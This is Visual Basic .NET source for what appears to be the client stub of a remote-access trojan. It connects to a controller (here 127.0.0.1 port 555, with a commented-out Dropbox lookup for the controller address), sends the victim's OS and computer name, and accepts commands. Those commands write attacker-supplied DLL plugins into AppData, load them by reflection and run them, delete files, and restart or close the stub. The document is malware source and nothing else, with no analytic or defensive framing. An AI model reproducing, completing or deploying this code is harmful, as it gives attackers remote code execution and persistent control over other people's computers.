Imports System.IO, System.Net.Sockets, System.Threading, System.Globalization, System.Reflection
Module Module1
    Dim TCP As TcpClient
    Dim spliter As String = "[||SPLT||]"
    Dim b(4096 * 4096) As Byte
    Dim pppp As String

    Sub main()
        
        Dim okj As Integer = 0
        For Each x As Process In Process.GetProcesses
            If x.ProcessName = Process.GetCurrentProcess.ProcessName Then
                okj += 1
            End If
        Next
        If okj > 1 Then End
        'Thread.Sleep(30000)
        Try
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\Delete.txt") Then
                Dim o As String = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\Delete.txt")
                Dim splits As String() = o.Split(New String() {Environment.NewLine},
                                       StringSplitOptions.None)
                For index = 0 To splits.Length - 1
                    If File.Exists(splits(index)) Then
                        File.Delete(splits(index))
                    End If
                Next
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\Delete.txt", "")
            End If
        Catch ex As Exception
        End Try
        connect()
        Application.Run()
    End Sub
    Sub connect()
go:
        Try
            '----
            'Dim a As Net.HttpWebRequest
            'a = Net.WebRequest.Create("https://dl.dropboxusercontent.com/s/cuq1rg2uxjz593p/ip.txt?dl=1&token_hash=AAF99azJGq6Nf77LWF4IC8ukA-DLf2z60d9gIIeBcDHzCQ&expiry=1402478390")
            'Dim bb As Net.HttpWebResponse = a.GetResponse
            'Dim str As IO.Stream = bb.GetResponseStream
            'Dim l As New IO.StreamReader(str)
            'pppp = l.ReadToEnd
            'If pppp = "" Then
            '    Thread.Sleep(1000)
            '    GoTo go
            'End If
            '----
            TCP = New TcpClient
            TCP.Connect("127.0.0.1", 555)
            Send(T2B(Get_Info))
            TCP.GetStream.BeginRead(b, 0, b.Length, AddressOf rec, Nothing)
        Catch ex As Exception
            Thread.Sleep(1000)
            GoTo go
        End Try
    End Sub
    Sub rec(ByVal ar As IAsyncResult)
        Try
            Dim l As Integer = TCP.GetStream.EndRead(ar)
            If l <= 0 Then TCP.Close() : Thread.Sleep(1000) : connect() : Exit Sub
            Filter(b, l)
            Array.Clear(b, 0, b.Length)
            TCP.GetStream.BeginRead(b, 0, b.Length, AddressOf rec, Nothing)
        Catch ex As Exception
            TCP.Close()
            Thread.Sleep(1000)
            connect()
        End Try
    End Sub
    Sub Set_Plugin()
        My.Computer.FileSystem.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins")
    End Sub
    Function Get_Info() As String
        Dim o As String
        Dim p As Integer = 0
        If Get_Plugins().Length = 0 Then
            p = 0
        Else
            For x = 0 To Get_Plugins.Length - 1
                o &= Get_Plugins(x) & "||"
            Next
        End If
        Return "Info" & spliter & My.Computer.Info.OSFullName & spliter & My.Computer.Name & spliter & CultureInfo.CurrentCulture.EnglishName.Split("(")(1).Replace(")", "") & spliter & o & spliter
    End Function
    Function Get_Plugins() As String()
        Dim o As New List(Of String)
        If My.Computer.FileSystem.DirectoryExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins") Then
            For Each x In My.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins")
                Dim k As New FileInfo(x)
                If k.Extension.Contains(".dll") Then
                    Dim p = Split(k.Name, ".")
                    o.Add(p(p.Length - 2))
                End If
            Next
            Return o.ToArray
        Else
            Set_Plugin()
            Return Nothing
        End If
    End Function
    Sub Send(ByVal Bytes As Byte())
        Try
            TCP.GetStream.BeginWrite(Bytes, 0, Bytes.Length, Nothing, Nothing)
        Catch ex As Exception

        End Try

    End Sub
    Sub Filter(ByVal data As Byte(), ByVal count As Integer)
        If B2T(data, count).Contains(spliter) = False Then Exit Sub
        Dim p As List(Of Byte()) = SplitBytes(data, spliter)
        Dim l As String = B2T(p(0))
        If l = "Close" Then
            End
        ElseIf l = "Restart" Then
            Application.Restart()
        ElseIf l.Contains("N!$Plugin") Then
            My.Computer.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\" & Split(l, "-|{/\}|-")(1) & ".dll", p(1), False)
            Send(T2B("Plugins" & spliter & Plugins()))
        ElseIf l = "DPlugin" Then
            Dim oo As String = B2T(p(1))
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\Delete.txt", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\" & oo & vbNewLine)
        ElseIf l = "RPlugin" Then
            Dim by As Byte() = RunPlugin(B2T(p(1)), B2T(p(2)), B2T(p(3)))
            
            Send(JoinBytes(T2B("Recive"), by, spliter))
        ElseIf l = "GetMethors" Then
            Dim jk As String = GetMethors(B2T(p(1)))
            If Not jk = "" Then Send(T2B("Methors" & spliter & B2T(p(1)) & spliter & jk & spliter))
        End If
    End Sub
    Function Plugins() As String
        Dim o As String
        If Get_Plugins().Length = 0 Then
            o = "Null"
        Else
            For x = 0 To Get_Plugins.Length - 1
                o &= Get_Plugins(x) & spliter
            Next
        End If
        Return o
    End Function
    Function GetMethors(ByVal Plugin_Name As String) As String
        Dim p As String = ""
        Try
            For Each x As Reflection.MemberInfo In Reflection.Assembly.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\" & Plugin_Name & ".dll").GetType(Plugin_Name & ".Class1").GetMembers
                p &= x.Name & spliter
            Next
        Catch ex As Exception
        End Try
        Return p
    End Function
    Function RunPlugin(ByVal Plugin_Name As String, ByVal Methor_Name As String, ByVal Paramatre As String) As Byte()
        Try
            Dim a = System.Reflection.Assembly.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Plugins\" & Plugin_Name & ".dll")
            Dim k As Type = a.GetType(Plugin_Name & "." & "Class1")
            For Each x As MethodInfo In k.GetMember(Methor_Name)
                Return x.Invoke(Nothing, New Object() {Paramatre})
            Next
        Catch ex As Exception
        End Try
    End Function
#Region "Functions"
    Function T2B(ByVal Text As String) As Byte()
        Return System.Text.Encoding.ASCII.GetBytes(Text)
    End Function
    Function B2T(ByVal Bytes As Byte(), count As Integer) As String
        Return System.Text.Encoding.ASCII.GetString(Bytes, 0, count)
    End Function
    Function B2T(ByVal Bytes As Byte()) As String
        Return System.Text.Encoding.ASCII.GetString(Bytes)
    End Function
    Function JoinBytes(ByVal Bytes1 As Byte(), ByVal Bytes2 As Byte(), ByVal Spliters As String) As Byte()
        Try
            Dim B(Bytes1.Length + Bytes2.Length + Spliters.Length + Spliters.Length) As Byte
            Bytes1.CopyTo(B, 0)
            Dim S As Byte() = T2B(Spliters)
            S.CopyTo(B, Bytes1.Length)
            Bytes2.CopyTo(B, Bytes1.Length + Spliters.Length)
            Dim n As Byte() = T2B(Spliters)
            n.CopyTo(B, Bytes1.Length + Spliters.Length + Bytes2.Length)
            Return B
        Catch ex As Exception

        End Try
       
    End Function
    Function SplitBytes(ByVal Bytes As Byte(), ByVal Spliter As String) As List(Of Byte())
        Dim oo As New List(Of Byte())
        Dim gg As String() = Split(B2T(Bytes), Spliter)
        For x = 0 To gg.Length - 1 ' x=2
            Dim offest As Integer = 0
            For o = 0 To oo.Count - 1
                offest += oo.Item(o).Length
            Next
            offest += (x * Spliter.Length)
            Dim ll As New IO.MemoryStream
            ll.Write(Bytes, offest, gg(x).Length)
            oo.Add(ll.ToArray)
        Next
        Return oo
    End Function
#End Region
End Module
